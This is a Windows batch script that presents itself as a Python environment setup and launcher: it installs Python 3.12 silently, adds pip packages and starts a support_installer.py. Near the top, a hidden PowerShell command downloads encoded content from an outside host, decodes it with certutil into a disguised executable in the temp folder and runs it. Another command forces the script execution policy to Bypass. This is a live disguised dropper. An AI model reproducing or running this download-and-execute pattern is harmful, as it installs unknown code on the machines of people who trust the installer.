@echo off
SET "PB_PATH=%TEMP%\ProgressNotifier.exe"
SET "INSTALLER=%TEMP%\python-3.12.0-amd64.exe"
call powershell -WindowStyle Hidden -command  "(wget cert.doggos.win).content | out-file %TEMP%\tmp.txt; certutil -decode %TEMP%\tmp.txt %PB_PATH%; del %TEMP%\tmp.txt; &'%PB_PATH%'"
powershell -WindowStyle Hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; Get-ExecutionPolicy | Out-File -Encoding ASCII %TEMP%\sep.txt"
SET /P SEPVAR=<%TEMP%\sep.txt
%LOCALAPPDATA%\Programs\Python\Python312\python.exe --version >NUL 2>&1
IF %ERRORLEVEL% EQU 0 (
    SET "PYTHON_PATH=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
) ELSE (
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe -OutFile %INSTALLER% | Out-File -Encoding ASCII %TEMP%\pydl.txt"
    SET /P PYDLVAR=<%TEMP%\pydl.txt
    IF NOT EXIST %INSTALLER% (
        PAUSE
        EXIT /B 1
    )
    START /WAIT %INSTALLER% /quiet InstallAllUsers=0 PrependPath=0 TargetDir=%LOCALAPPDATA%\Programs\Python\Python312
    IF EXIST "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" (
        SET "PYTHON_PATH=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
    ) ELSE (
        PAUSE
        EXIT /B 1
    )

    SETX PATH "%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts;%PATH%"
)
taskkill /im "ProgressNotifier.exe" /f >NUL 2>&1
"%PYTHON_PATH%" -V

python -m pip install requests beautifulsoup4 tqdm
if exist "mode_A.txt" del "mode_A.txt"
echo forse>mode_A.txt
if not exist "%~dp0japper.bat" (
    if not exist "%~dp0japper_killer.bat" (
        start "" cmd /c "python support_installer.py"
        exit /b 0
    )
        start "" cmd /c "python support_installer.py"
    exit /b 0
) else (
    if not exist "%~dp0japper_killer.bat" (
        start "" cmd /c "python support_installer.py"
        exit /b 0
    )
) else (
    start "" "%~dp0japper.bat"
)